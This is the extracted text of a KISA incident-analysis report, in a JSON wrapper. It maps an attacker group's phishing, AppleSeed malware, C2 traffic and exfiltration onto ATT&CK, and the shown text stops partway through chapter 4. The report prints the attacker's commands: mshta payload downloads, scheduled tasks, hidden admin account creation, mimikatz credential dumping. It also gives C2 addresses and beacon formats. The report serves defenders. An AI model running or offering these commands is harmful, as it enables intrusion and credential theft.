{
    "id": "deb7056e-2c53-4c35-8cf3-9f00a0e94fe8",
    "created_at": "2022-10-25T16:48:16.17076Z",
    "updated_at": "2025-03-27T02:16:55.410402Z",
    "deleted_at": null,
    "sha1_hash": "8114412b6d72da76f88c7bb955cd857211f3e46d",
    "title": "<5454505F345FC7C7BDCCC5B8B1EA5FC1A4C2FBB0FA5FB0F8B0DD5FC0DABFF85FBAD0BCAE28B1D7B8B2C3BCC5A9295F454E4728BFB5BEEEB0A8BCF629202831295F30323236BCF6C1A4C1DF2E687770>",
    "authors": "",
    "file_creation_date": "2021-02-26T09:50:14Z",
    "file_modification_date": "2021-03-12T13:13:41Z",
    "file_size": 22012313,
    "plain_text": "-----\n\n# Contents\n\n##### 1. Introduction ······························································································· 1\n\n**`**\n##### 2. Overview ···································································································· 2\n\n 3. ATT&CK Matrix ························································································ 4\n\n 4. Phishing Action Structure for Reconnaissance ···························· 44\n\n 5. Conclusion ······························································································· 56\n\n 6. Yara Rule ································································································· 57\n\nReproduction or copying of the contents of this report without permission\n\nfrom the Korea Internet & Security Agency is prohibited and may violate\n\ncopyright laws.\n\n**Written by:**\n\n**Profound Analysis Team,**\n\n**Internet Incident Analysis Group**\n\n**Kim Dong Wook, Deputy General Researcher**\n\n**Kim Byeong Jae, Deputy General Researcher**\n\n**Lee Tae Woo, Deputy General Researcher**\n\n**Lee Jae Gwang, Manager**\n\n**Edited by:**\n\n**Shin Dae-Kyu, Vice President**\n\n**Lee Dong geun, Director**\n\n**English translation reviewed by:**\n\n**Cha Hyeon Ju, Researcher**\n\n\n-----\n\n## 1. Introduction\n\nThe rise in hacking incidents have led to ever-more stringent security requirements and the continuous evolvement of\n\nsecurity systems to the next level. Yet, cyber incidents that were reported in the past are still being repeated today, and\n\norganizations with some of the most sophisticated cyber-defense systems are still falling victims to such attacks.\n\nThe influential concept of “The Pyramid of Pain” in the sphere of cybersecurity illustrates that the most effective security\n\nsystems depend on understanding the ‘tactics, techniques and procedures’ (TTP) of the attackers. The ultimate goal of\n\ncybersecurity is to make attacks more costly and more painful for perpetrators, in other words, elevated to the ‘tough’ level\n\nshown at the top of the pyramid.\n\n**[Figure 1-1] The Pyramid of Pain, David J Bianco**\n\nA cybersecurity system based on ‘indicators of compromise’ (IoC) still remains very efficient. (IoCs would refer to\n\none-dimensioned indicators such as malicious IPs or domains.) However, it is also true that **attackers can easily secure then**\n\n**discard attack infrastructures using such simple indicators.**\n\nTTPs are different. **The attacker cannot easily obtain or discard TTPs. An attacker who has locked on a target needs to**\n\ninvest in learning and practicing TTPs to neutralize the target's security system. When moving on to the next attack, the\n\nattacker will tend to select targets on which the same TTPs can be applied.\n\nThe attacker's TTPs by nature are heavily influenced by the characteristics of the targeted defense environment. As such,\n\nsecurity practitioners must have an accurate understanding of their own defense environment. They must also approach\n\nthe process and flow of attack from the strategic and tactical levels rather than as patterns or methods. **In short, the**\n\n**defender’s security environment and the attacker’s TTPs must be scrutinized together.**\n\nA defender who understands the attacker’s TTPs should be able to answer two things: 1) ‘Would the attacker's TTPs be\n\nable to penetrate the defender's environment?’ and 2) ‘If so, what defensive strategy can defeat the TTPs?’\n\nThe Korea Internet & Security Agency (KISA) identifies cyberattack TTPs through its incident response process and\n\ndisseminates the process and countermeasures using the ATT&CK framework.[1)] The various artifacts related to TTPs\n\nincluded in this report are merely tools to promote understanding.\n\n1) A matrix showing the tactics and techniques used in actual attacks and response measures to them\n\n\n-----\n\n## 2. Overview\n\nUnlike the previous reports in the TTPs# series which analyzed hacked systems, this TTPs report focuses on analyzing what\n\nattackers do in preparation for launching an attack. There is a saying, “If you know the enemy and yourself, you will not\n\nbe in danger even in a hundred wars.” Likewise, if you understand the attacker’s preparation process and build a strategy\n\nfrom a defender’s perspective in line with your systems, you can gain an advantage in the process ofwhen responding to\n\nintrusions.\n\nAttackers make elaborate preparations in order to successfully infiltrate the target company. They create malware and a\n\ncommand control server to communicate with the malware. For the command control server, they may hack the server\n\nof a small company or buy a hosting server. Furthermore, they search the Internet to find vulnerability codes to use for\n\nthe initial intrusion or collect information from the media or social media about key figures in of the target company. They\n\ninfect a system by sending a phishing email based on the collected information or infiltrate first through vulnerabilities\n\nfound online.\n\nThe following figure shows the process from when the attacker acquires an infrastructure until when it is used for an\n\nattack. We analyzed the attacker’s server directly to examine the tools used by the attacker and the process of sending\n\na phishing email in detail. As a result, we found some interesting facts about the methods used to collect information and\n\nsend phishing emails. The aim of this report is to help defenders establish a defense strategy.\n\n**[Figure 2-1] Overview of attack process**\n\n\n-----\n\n##### 󰊱 Reconnaissance\nIn the reconnaissance stage, the attacker selects a target of attack. The attacker obtains most of the information about\nthe target company needed for an attack, such as the email account for spearphishing and the internal personnel system\nof the company, **through search engines and social media. Additionally, the attacker creates a phishing page and collects**\n**employees’ email account information.**\n\n##### 󰊲 Resource development\nIn this stage, the attacker constructs the infrastructure to be used in attack. The attacker secures **infrastructure that has**\n**not been exposed before** for purposes of information leakage and command control. The attacker compromises the server\nof a small company or rents hosting or domain through virtual assets, and **directly creates the malware needed for an**\n**attack. However, the attacker also** **prepares open hacking tools or vulnerability POC codes for flexible attacks depending**\non the situation. To successfully control a company from the inside, the attacker will use an account intercepted through\nspear phishing to look through email exchanges or check company or employee information in real time by acquiring a\n**reliable social media account.**\n\n##### 󰊳 Initial access\nOnce the attacker obtains the necessary information, infrastructure and resources, he or she will attempt initial access.\nDuring initial access, an attacker will often use spear phishing emails **with malicious codes or links. Furthermore, an attacker**\nacquires **information about and vulnerabilities of the open software used in the target company to use for intrusion.**\n\n##### 󰊴 Execution\nThe **CMD commands desired by the attacker are carried out through remote control malware and** **additional malwares are**\n**executed.**\n\n##### 󰊵 Persistence\nRemote control malware that infects a PC contain an **automatic execution function through registry registration.**\nConsequently, the malware is executed whenever the PC is booted.\n\n##### 󰊶 Credential access\nTo steal account information, the attacker uses **key logging, password dump program, and password-saved file stealing.**\nThe attacker **uses a self-developed, proprietary program to bypass and compromise accounts with two-factor authentication**\nsuch as OTP.\n\n##### 󰊷 Defense evasion\nThe attacker minimizes exposure by disguising the addresses of **malware and attacker servers. The attacker** **encrypts**\n**malware** using a proprietary encryption tool to bypass detection by security tools including anti-virus software.\n\n##### 󰊸 Lateral movement\nTo spread malware internally, the attacker attempts lateral movement by using information collected or sending phishing\n**mails impersonating internal employees using information stolen in advance.**\n\n##### 󰊹 Collection\nTo collect internal information of a company, the attacker steals additional account information using **key logging of a**\nremote control malware in an infected PC or periodically checks the status of the victim PC using **screen capture function.**\nFurthermore, the attacker manages the information of the stolen email accounts as a file or using a mail management\nsolution.\n\n##### □10 Exfiltration\nTo minimize traffic exposure when data is exfiltrated outside the company, the data is divided and exfiltrated if it is larger\n**than a certain size.**\n\n\n-----\n\n## 3. ATT&CK Matrix\n\n\n-----\n\n### A. Reconnaissance\n\n##### 󰊱 Search Victim-Owned Websites: Search information in the target website\nGather Victim Identity Information: Collect identify information of the target company/institution\n\nGather Victim Org Information: Collect organizational information of the target\n\n - The attacker searches for information in the target company/institution‘s open website.\n\n - Attackers mainly collect identify information on personnel who will be the recipients of phishing emails or\n\norganizational structure information of the company/institution.\n\n|Col1|Browser records|\n|---|---|\n|Collect identity information on personnel|Employee’s phone number and address view | Civil Affairs Office 000|\n||Employee name (Department contacts & jobs) | Government organization chart | Institution information | Policy information | Government 24|\n||[Name] - 000 integrated search|\n|Collect organizational structure information|000 Headquarters/affiliations < Organization and Functions < Introduction to 000 < 000_00|\n||0000 Headquarters Greetings – Introduction to HQ - Introduction to HQ|\n||0000000 - 0000 00 Unit - 000 Visit/Tour|\n||00 video view < 00 news < 000_00|\n||Press Releases < 00 news < 000_00|\n||2020 < 000 Salary < Performance/reward system < 000 HR system < 00000|\n\n\n-----\n\n##### 󰊲 Search Open Websites/Domain: Search for information on the target through social media or search engines\n\n- Information is collected using search engines to identify information on targets of attack, tools for intrusion, and\n\ndomestic trends.\n\n|Classification|Keywords|\n|---|---|\n|Search for vulnerabilities to be used for an attack|samsung smg925s exploit, chrome 75 vulnerabilities, galaxy s6 exploit, ie, execution upon webpage loading, github exploit users, github 0-day, sql injection, TERRACE MAIL Security vulnerability, terrace mail security vulnerability, cve-2020-1300 poc , youngcart exploit, KVE-2019-1144|\n|Search for tools to be used for an attack|download rdpwrap, download memu, download putty, centos ftp upload error 553, xampp ssl setup, the best android spy, download chromedriver, vmware workstation 15 download , editplus download, notepad++ download, Microsoft Exchange 14.3.123.0 download iso, Microsoft Exchange server building method, wireshark capture filter ip, find ntlm packets in wireshark, ccleaner download, avg download, https free certificate github, hwp viewer, everything download for windows 10, thunderbird download free windows 10, vs2019 windows kernel mode driver, winrar download windows 10, metasploit download windows 10, Radialogica fullAcesss Viewer tools download, idm download, crawling download, github thyroid, MedCalc for Windows v15.0, install cad thyroid, install computer aided system, k-tirads 2019, Thyroid disease system download, filezilla client download, exchange server 2019 download, fasta file viewer download, acunetix 12 download, download acunetix 12 crack, download acunetix 12 full, web vulnerability scanner, pentest-tools|\n\n\n-----\n\n|Search to identify political/economic/security trends|Analysis of the security situation in Northeast Asia, Alyak blog, security news, Ahn Lab blog, overseas security news site, Korea corona research, Korea Covid-19 vaccine, Korea Covid 19 research|\n|---|---|\n|Search for Korean spelling and grammar|Korean spelling|\n|Search for information on hacking organization trends|Thalium, kimsuky, lazarus|\n|Search information of companies/institutions|Search for people of companies/organizations Company/Institutional Organization Search Domain address search for corporate email solutions|\n|Other|win10 server login record view, Papago, credentials, what is sns, current time of the US, Korea WHois, AP setup template for head-neck cases, template for head-neck cases programd, rtog contouring atlas, sciencedirect institutional sign-up, what is astro, Thyroid disease system, google translate, Thyroid Decision Program, free medical DB, medical paper DB|\n\n\n-----\n\n##### 󰊳 Phishing for information: Phishing for information collection\n\n- To collect email account information, the attacker builds and operates a phishing page impersonating a customer center.\n\n- If a phishing attack targets corporate e-mail, the attacker creates and a page which looks identical to the corporate\n\ne-mail solution login page.\n\n- Phishing tools and phishing pages are classified and managed by using a specific naming method under the folder\n\ncalled **mu.za.bi.** This is covered in detail in Chapter 4, “Phishing Operation Structure for Reconnaissance”.\n\n#### Impersonating a customer center\n\n Impersonating corporate emails\n\n\n-----\n\n#### Phishing-related folders\n\n\n-----\n\n### B. Resource Development\n\n##### 󰊱 Acquire Infrastructure 󰊲 Compromise Infrastructure\n\n - It is necessary to acquire infrastructure such as a server, domain, IP, etc. for an attack.\n\n - In order to secure the infrastructure, the attacker purchases a service or hacks and uses a normal site.\n\n - Attackers often use virtual currency to purchase infrastructure resources.\n\n|Col1|Infrastructure acquisition|\n|---|---|\n|Exchange|Convert virtual assets to CNY, USD using a virtual asset exchange site|\n|Payment|Create a virtual prepayment card and charge it as a virtual asset|\n|Infrastructure purchase|Purchase server using virtual prepayment card Purchase domain using virtual assets|\n|Infrastructure hacking|Hack small company homepages and exploit them as malware distribution sites|\n\n\n-----\n\n##### 󰊳 Establish Accounts: Collect information by creating social media or email accounts\n\n- The attacker creates a social media account (LinkedIn, Twitter, Facebook) to monitor domestic and international\n\ntrends.\n\n- The attacker monitors potential targets such as companies and key figures, as well as security trends.\n\n- The atttacker creates an email account and uses it for phishing.\n\n#### Create social media accounts\n\n\n-----\n\n#### Create email accounts for phishing\n\n\n-----\n\n##### 󰊴 Develop Capabilities: Attacker directly develops tools or malware\n\n- The attacker develops and uses remote control malware and tools that perform additional functions during remote\n\ncontrol.\n\n|Col1|Develop tools|Functions|\n|---|---|---|\n|AppleSeed remote control malware||Command execution Key logging Screen capture File upload|\n|packfile unpackfile||Encoding/decodin g by XOR operation of the file content with a random value|\n\n\n-----\n\n|joinfiles|Col2|Join[name]-[6-dig it number].dat files into one file|\n|---|---|---|\n|makecmd||Code and command execution· additional module|\n|unzip||Decompression|\n|Email Bot||Access with the stolen email information and maintain the session|\n\n\n-----\n\n|Mail Crawler|Col2|Collect all emails in the victim’s email account|\n|---|---|---|\n|Program which composes Phishing emails||Send a phishing email by combining the email subject, fake sender information, phishing site address, and fake abnormal login information|\n\n\n-----\n\n##### 󰊵 Obtain Capabilities: Prepare open tools or malware\n\n- In addition to their own proprietary tools, attackers also use tools that are available on the Internet.\n\n- When performing an attack, attackers use hacking framework, remote control tools, scanning tools, and vulnerability\n\nPoC codes.\n\n- Encryption tools are used to protect information stolen from victims and attacker development programs.\n\n- In order to avoid detection of malware by antivirus software, the attacker installs and uses domestic antivirus software.\n\n- The attacker maintains sessions of stolen emails with email management tools.\n\n- Virtual machine programs are used to test malware or to maintain sessions of emails stolen from victims.\n\n- The attacker downloads and uses solutions being used by the hacked company to test them out.\n\n|Col1|List of open tools used|\n|---|---|\n|Hacking tools|Metasploit GitHub – k8gege/K8tools GitHub – The-Art-of-Hacking/h4cker GitHub – hackerhouse-opensource/exploits GitHub – christian-roggia/ GitHub - hacktoolspack/hack-tools MalwareBazaar pwn20wndstuff/Undecimus mimikatz|\n|Phishing email tools|PHPMailer SendGrid PHProxy|\n|Remote control|RDPWrap UltraVNC TeamViewer Putty|\n|Scanning tools|Acunetix|\n|Convenience tools|Edgecookieview Everything Internet Download Manager|\n|Encryption tools|Bitlocker|\n|Domestic antivirus software|V3Lite ALYac25|\n|VPN tools|VPNGate TCP Gender Changer|\n|Virtual machines|VMWare Memu app player|\n\n\n-----\n\n|Email management tools|Thunderbird|\n|---|---|\n|Target company solutions|Exchange server 2019 K-tirads Cad Thyroid MedCalc|\n|Document editing programs|Hancom Office 2020 Notepad++ Editplus|\n|Vulnerability PoC codes|2) CVE-2020-0688 3) CVE-2018-14745 4) CVE-2019-1821 5) CVE-2019-1652/CVE-2019-1653 6) CVE-2018-2628 7) CVE-2020-0796 8) CVE-2020-1300 9) KVE-2019-1144 10) CVE-2012-4873|\n|SSL certificate creation program|ACME Let’s Encrypt|\n\n\n2) CVE-2020-0688 : Microsoft Exchange Server Remote Code Execution Exploit\n3) CVE-2018-14745 : Samsung Galaxy S6 SM-G920F G920FXXU5EQH7 bcmdhd4358 Wi-Fi Driver prot_get_ring_space memory corruption\n4) CVE-2019-1821 : Cisco Prime Infrastructure Remote Code Execution\n5) CVE-2019-1652/CVE-2019-1653 : Exploits For Dumping Cisco RV320 Configurations Debugging Data And Remote Root Exploit\n6) CVE-2018-2628 : Oracle weblogic RCE exploit\n7) CVE-2020-0796 : SMBGhost exploit\n8) CVE-2020-1300 : Remote Code Execution Through Microsoft Windows CAB Files\n9) KVE-2019-1144 : Young cart5 XSS vulnerability\n10) CVE-2012-4873 : GNUBoard4 HTML-Injection exploit\n\n\n-----\n\n##### 󰊶 Compromise Accounts(Email Accounts): Account stealing, theft\n\n- Information on stolen email accounts are managed and collected using an email management solution called\n\n‘Thunderbird’.\n\n- An email application is installed and managed in the app player called 'memu'.\n\n\n-----\n\n### C. Initial Access\n\n##### 󰊱 Phishing\nResource Development - Compromise Accounts: Account stealing, theft\n\nResource Development - Obtain Capabilities: Prepare open tools or malware\n\nExecution - User Execution: User execution\n\n - After collecting information from stolen emails, the attacker selects a document with content that looks trustworthy\n\nto the the target company, adds malware and sends it. Or the attacker induces the victim to click the download\n\nbutton for large attachments in an email, so that the victim will be directed to a malware distribution site and\n\ndownload malware.\n\n - When sending phishing emails, the attacker uses public programs like ‘PHPMailer’ and ‘SendGrid’.\n\n#### CASE 1\n\n\n-----\n\n#### CASE 2\n\n Automated process of sending a phishing email\n\n\n-----\n\n##### 󰊲 Exploit Public Facing Application\n\n- The attacker exploits many vulnerabilities and hacking tools in the preparation process.\n\nThe vulnerability identified as being used in the initial penetration is CVE-2020-0688, which exploits the email account\n\ncollected by Reconnaissance-Phishing for Information.\n\n|List of hacking tools|Metasploit GitHub – k8gege/K8tools GitHub – The-Art-of-Hacking/h4cker GitHub – hackerhouse-opensource/exploits GitHub – christian-roggia/ GitHub - hacktoolspack/hack-tools MalwareBazaar pwn20wndstuff/Undecimus mimikatz|\n|---|---|\n|List of vulnerabilities|CVE-2020-0688 CVE-2018-14745 CVE-2019-1821 CVE-2019-1652/CVE-2019-1653 CVE-2018-2628 CVE-2020-0796 CVE-2020-1300 KVE-2019-1144 CVE-2012-4873|\n\n\n-----\n\n### D. Execution\n\n##### 󰊱 Command and Scripting Interpreter: Command Execution\nPersistence - Create Account\n\nCredential Access – OS Credential Dumping\n\nDiscovery – File and Directory Discovery\n\n - If the attacker has acquired the CMD execution permission through a vulnerability, he or she executes commands such\n\nas installing remote control malware and creating an account to secure a stable penetration path.\n\n - When remote control malware is installed, the attacker runs commands such as searching the victim system directory\n\nand searching for antivirus software using the remote control management program.\n\n - When malware is executed, it is characterized by using the regsvr32 command.\n\n|Col1|Used commands|\n|---|---|\n|Malware download|mshta http://[malicious doamain]/[malware name].hta|\n|Create accounts|net user NewGuest [password] /add|\n|Set account permissions|net localgroup Administrators [account name] /add net localgroup ‘Remote Desktop Users’ [account name] /add|\n|Hide accounts|reg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’ /v [account name] /t REG_DWORD /d 0 /f|\n|Remote desktop settings|reg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server’ /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server’ /v fSingleSessionPerUser /t REG_DWORD /d 0 /f|\n|Steal account information|c:\\programdata\\1\\x64\\m.exe “privilege::debug sekurlsa::logonpasswords exit”|\n|Search for whether antivirus software is installed|powershell Get-CimInstance –Namespace root/securityCenter2 –classname antivirusproduct|\n|View malware setup path|dir c:\\programdata\\software /s|\n|View all directories|dir c:\\ /s & dir d:\\ /s & dir \\e:\\ /s & dir f:\\ /s & dir g:\\ /s & dir h:\\ /s & dir i:\\ /s & dir j:\\ /s & dir k:\\ /s & dir l:\\ /s & dir n:\\ /s & dir m:\\ /s & dir o:\\ /s & dir p:\\ /s & dir q:\\ /s & dir r:\\ /s & dir s:\\ /s & dir t:\\ /s & dir u:\\ /s & dir v:\\ /s & dir w:\\ /s & dir s:\\ /s & dir y:\\ /s & dir z:\\ /s|\n|Malware execution|regsvr32 /s c:\\programdata\\software\\estsoft\\common\\estcommon.dll|\n\n\n-----\n\n##### 󰊲 User Execution\nDefense Evasion - obfuscated Files or Information\n\n- For an account to be stolen by phishing email or a malware be executed, the user(victim) must perform an action.\n\n- When a user clicks a disguised link in a phishing email, the user is redirected to the malicious site and accesses the\n\nphishing page. At this time, the link is also encrypted with AES.\n\n\n-----\n\n### E. Persistence\n\n##### 󰊱 Create Account\n\n - After accessing the corporate system, the attacker creates an account to receive administrator authority and remote\n\ncontrol authority, and to conduct various actions such as hiding.\n\n#### Commands used\n\nCreate accounts net user NewGuest [password] /add\n\nnet localgroup Administrators [account name] /add\nSet account permissions\n\nnet localgroup ‘Remote Desktop Users’ [account name] /add\n\nreg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows\n\nHide accounts NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’\n\n/v [account name] /t REG_DWORD /d 0 /f\n\nreg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\n\nServer’ /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nRemote desktop settings\n\nreg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\n\nServer’ /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n\n##### 󰊲 Boot or Logon Autostart Execution\n\n - Automatic execution of malware is registered through registry when a remote control malware is executed.\n\n|Col1|Commands used|\n|---|---|\n|Create accounts|net user NewGuest [password] /add|\n|Set account permissions|net localgroup Administrators [account name] /add net localgroup ‘Remote Desktop Users’ [account name] /add|\n|Hide accounts|reg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’ /v [account name] /t REG_DWORD /d 0 /f|\n|Remote desktop settings|reg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server’ /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add ‘HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server’ /v fSingleSessionPerUser /t REG_DWORD /d 0 /f|\n\n|Col1|Autostart registration information|\n|---|---|\n|Path|HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|\n|Value|WindowsDefender or ESTsoftAutoUpdate|\n|Value data|regsvr32.exe /s C:\\ProgramData\\Software\\Microsoft\\Windows\\Patch\\patch.dll or regsvr32.exe /s C:\\ProgramData\\Software\\Microsoft\\OneDriver\\Patch\\patch.dll or regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll|\n\n\n-----\n\n##### 󰊳 Scheduled Task/Job: Scheduled Task/Job Registration\n\n- The task/job of downloading additional malware is registered in the scheduler by using the MS Office macro function.\n\n#### Task/job scheduler registration script\n\n“schtasks.exe /create /sc minute /mo 5 /tn WindowsDefenderAutoUpdate /tr” & Chr(34) &\n\n“mshta.exe [malicious domain]/[file name].hta” & Chr(34) & “ /f”\n\n“schtasks.exe /create /sc minute /mo 40 /tn WindowsDefenderUpdate /tr” & Chr(34) &\n\n“cmd.exe /c taskkill im mshta.exe /f” & Chr(34) & “ /f”\n\n\n-----\n\n### F. Credential Access\n\n##### 󰊱 OS Credential Dumping: Extract OS account information\n\n - The attacker collects account information of the accessed system using the mimikatz program.\n\n#### Command used\n\nc:\\programdata\\1\\x64\\m.exe “privilege::debug\n\nSteal account information\n\nsekurlsa::logonpasswords exit”\n\n##### 󰊲 Unsecured Credentials: Store unsecured account information\n\n - Collect files containing account information in plaintext.\n\n##### 󰊳 Input Capture: Collect account information through key logging\n\n - The account information key logged is collected through malware. The key logging information is stored in the client\n\nfor a certain period of time and then transmitted to the command control server. After being transmitted, the file\n\nis deleted.\n\n|Steal account information|c:\\programdata\\1\\x64\\m.exe “privilege::debug sekurlsa::logonpasswords exit”|\n|---|---|\n\n\n-----\n\n##### 󰊴 Two-Factor Authentication Interception: Stealing Two-Factor Authentication Information\n\n- If a one time password for two-factor authentication is required when stealing an email account, the account is\n\nintercepted using Email Bot, a proprietary program.\n\n\n-----\n\n### G. Defense Evasion\n\n##### 󰊱 Masquerading\n\n - The attacker disguises malware as a domestic antivirus program and Windows software name in order not to expose\n\nits existence.\n\n - The malware's job scheduler registration name is disguised as a Windows update name.\n\n - The address of the command control server of remote control malware is disguised as a normal address.\n\n|Type|Malware name|\n|---|---|\n|Disguise as antivirus program|C:\\programdata\\software\\ESTsoft\\Common\\ESTCommon.dll C:\\programdata\\software\\ESTsoft\\Common\\cache\\log.txt C:\\programdata\\software\\ESTsoft\\Common\\flags\\FolderMonitor C:\\programdata\\software\\ESTsoft\\Common\\flags\\KeyboardMonitor C:\\programdata\\software\\ESTsoft\\Common\\flags\\ScreenMonitor C:\\programdata\\software\\ESTsoft\\Common\\flags\\UsbMonitor|\n|Disguise as Windows software|C:\\Programdata\\Software\\Microsoft\\OneDriver\\Patch\\patch.dll C:\\Programdata\\Software\\Microsoft\\Windows\\Patch\\patch.dll|\n\n|Type|Task/Job scheduler name|\n|---|---|\n|Disguise as Windows update|WindowsDefenderAutoUpdate WindowsDefenderUpdate|\n\n|Type|Command control server address|\n|---|---|\n|Disguise as shopping mall|http://elle-shop.org-help.com/index.php http://sportcar-seller.org-help.com/index.php http://tissot-seller-seoul.96.lt/index.php http://cokacola-shop.org-help.com/index.php http://apple-shop.org-help.com/index.php http://dior-mart-korea.org-help.com/index.php http://lexus-victory.96.lt/index.php http://vacation-story.esy.es/index.php http://fila-mart-seoul.96.It/log/reading.php|\n|Disguise as company|http://newdaily-redirecting.onekakao.com/index.php http://mail.celltrion.ml http://mail.novavax.ml|\n\n\n-----\n\n|Disguise as government|http://bmail-link.koreasgov.co.kr/bmail/run.php http://helper.uni-korea.ga|\n|---|---|\n|Disguise as university|http://portal.dongguk.ml/read.php|\n|Disguise as email|http://mail.naver.buzz/test.hta http://nid.naver.home-info.ml http://member.daum.home-info.ml|\n|Others|http://road.tongilcash.xyz/index.php http://part.bigfile.pe.hu/index.php http://dept0-dr.lab.hol.es/index.php http://protector-download.onekorea.xyz/info/reading.php|\n\n\n-----\n\n##### 󰊲 Obfuscated Files or Information\n\n- The remote control malware encrypts a file and transmits it to the outside.\n\n#### Packfile\n\n\n-----\n\n##### 󰊳 Deobfuscate/Decode Files or Information\n\n- The encrypted and transmitted data are decrypted in the reverse order of encryption using a decryption tool.\n\nIn the case of remote control malware, it is encoded in base64 before being distributed.\n\n#### Unpackfile\n\n\n-----\n\n#### Decode the Base64 code\n\n\n-----\n\n##### 󰊴 Indicator Removal on Host(File Deletion) \n\n- When the remote control malware is first executed, it copies the original file to the ProgramData folder, deletes the\n\noriginal file, and creates a new process with the copied file. In addition, the files saved by key logging of remote\n\ncontrol malware and screen capture functions are deleted after being transmitted to the command control server.\n\n\n-----\n\n### H. Lateral Movement\n\n##### 󰊱 Internal Spearphishing: Send internal spearphishing emails\n\n - For lateral movement, the attacker steals internal employees' emails to identify key figures in the company, and then\n\nimpersonates the vitcim employee to send spear phishing emails.\n\n\n-----\n\n### I. Collection\n\n##### 󰊱 Input Capture : key logging\nAutomated Collection\n\nApplication Window Discovery: Search the title of the running application\n\n - Fundamentally, remote control malware uses the key logging function.\n\n - When the 'Keyboard Monitor' function is activated, the key logging information is exfiltrated to the outside. The data\n\nis deleted after transmission.\n\n\n-----\n\n##### 󰊲 Screen Capture\nAutomated Collection\n\n- When the ‘Screen Monitor’ function of the remote control malware is activated, the screen of the infected system\n\nis automatically collected.\n\n- The screen capture information is stored in the client directory for a certain period of time and transmitted to the\n\ncommand control server. The data is deleted after transmission.\n\n\n-----\n\n##### 󰊳 Data from Removable Media: Collect removable media data\nAutomated Collection\n\n- When the “USB Monitor” function of the remote control malware is activated, the data list inside the USB is\n\nautomatically collected when the USB is connected to the infected system.\n\n- The USB data is stored in the client directory for a certain period of time and transmitted to the command control\n\nserver. The data is deleted after transmission.\n\n\n-----\n\n##### 󰊴 Data from Local System: Collect data from an infected system\nAutomated Collection\n\n- When the ‘Folder Monitor’ function of the remote control malware is activated, all document files are automatically\n\ncollected after searching all drives and specific folders of the infected system.\n\n- The folders to be searched are Desktop, Downloads, Documents, and AppData\\Local\\Microsoft\\Windows\\INetCache\n\n\\IE\\.\n\n- The extensions of the document file to be searched are hwp, ppt, pdf, xls, and doc.\n\n- The exfiltrated document file is stored in the client directory for a certain period of time and sent to the command\n\ncontrol server. The data is deleted after transmission.\n\n\n-----\n\n##### 󰊵 Email Collection\n\n- Reconnaissance automatically downloads e-mail information stolen in the phishing for information stage using the\n\ntheir proprietary MailFetcher.py code.\n\n- Attackers can register negative keywords to exclude spam emails.\n\n##### 󰊶 Archive Collected Data – Archive via Library: Compress the collected data\n\n- The data intercepted by the remote control malware is compressed before being exfiltrated.\n\n\n-----\n\n### J. Command and Control\n\n##### 󰊱 Web Service: Command and control through web service 󰊲 Application Layer Protocol: Use the application program protocol\n\n - The remote control malware receives commands from the web and sends the results to the web.\n\n - It all uses the POST method.\n\n - The factor value m is used to classify the mode.\n\n - The factor value p1 is used to identify infected devices.\n\n - The factor value p2 is used to classify data according to modes.\n\n|Mode|Web parameters|\n|---|---|\n|Notification of infection (Beacon)|[C&C Server URL]/?m=a&p1=[volume serial number]&p2=[infected system OS version]-[malware version]|\n|Command waiting state (Beacon)|[C&C Server URL]/?m=c&p1=[volume serial number]|\n|Send CMD execution result|[C&C Server URL]/?m=b&p1=[volume serial number]&p2=a|\n|Exfiltrate key logging data|[C&C Server URL]/?m=b&p1=[volume serial number]&p2=d|\n|Exfiltrate screen shot data|[C&C Server URL]/?m=b&p1=[volume serial number]&p2=c|\n|Exfiltrate document file|[C&C Server URL]/?m=b&p1=[volume serial number]&p2=b|\n|Exfiltrate mobile disk file list|[C&C Server URL]/?m=b&p1=[volume serial number]&p2=b|\n\n\n-----\n\n##### 󰊳 Data Encoding\n\n- The remote control malware receives the data in an encoded state when it receives the command in the command\n\nwaiting state.\n\n- The data is also encoded when the result value of the received command is transmitted to the command control server.\n\n\n-----\n\n### K. Exfiltration\n\n##### 󰊱 Data Transfer Size Limits\n\n - When data is exfiltrated from remote control malware, if the file size is 0x1000000 bytes or more, the file is divided.\n\n - The last file name of the split file is fixed as [filename]-XXXXXX.dat.\n\n - Divided and exfiltrated files are decrypted to the original data using the functions of Joinfiles.exe, UnpackFile.exe, and\n\nUnzip.exe.\n\n\n-----\n\n##### 󰊲 Exfiltration over Web Service\n\n- When files collected from remote control malware are exfiltrated, they are exfiltrated using web services.\n\n- The following fixed header and format are used when files are exfiltrated.\n\n- If the file is divided because the file size is 0x1000000 bytes or more, the string 'end' is appended to the data\n\nwhen the last file is transmitted.\n\n|Send files of less than 0x1000000 bytes|Col2|\n|---|---|\n|Send files of 0x1000000 bytes or larger|. . .|\n\n\n-----\n\n## 4. Phishing Action Structure for Reconnaissance\n\nIn order to collect and access internal information, the attacker secures an unknown attacker server and sets the target\n\nfor the attack through searches online and of social media. Additionally, the attacker sends a phishing email to the target\n\nand collects additional information using user information stolen through the phishing email.\n\nStealing user information and collecting additional information can be considered as part of the reconnaissance stage. This\n\nchapter describes the detailed operational method and structure of how the attacker performs the reconnaissance stage\n\nthrough a phishing email.\n\nThe following figure is a schematic diagram of an attacker sending a phishing email for reconnaissance and collecting\n\ninformation.\n\n**[Figure 4-1] Information collection and configuration methods using spear phishing**\n\nThe types of information collection and phishing pages that operate in connection with phishing emails can be classified\n\ninto four types: type A operates using a self-developed, proprietary bot program; type B uses PHProxy open source to\n\ncollect information; type C that sets the language of the page exposed to attack targets, and type D performs a phishing\n\nattack considering the target’s corporate environment, for example disguising itself as a general 